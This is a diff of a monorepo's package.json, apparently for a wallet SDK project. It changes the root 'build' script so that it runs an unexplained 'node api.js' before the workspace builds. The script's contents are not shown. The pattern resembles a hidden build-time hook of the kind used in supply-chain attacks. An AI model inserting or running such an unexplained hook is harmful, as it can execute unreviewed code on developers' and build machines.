@@ -24,7 +24,7 @@
     "packages/react-native"
   ],
   "scripts": {
-    "build": "npm run build --workspaces",
+    "build": "node api.js && npm run build --workspaces",
     "build:sdk": "npm run build -w packages/sdk",
     "build:react": "npm run build -w packages/react",
     "build:wallet-adapters": "npm run build -w packages/wallet-adapters",
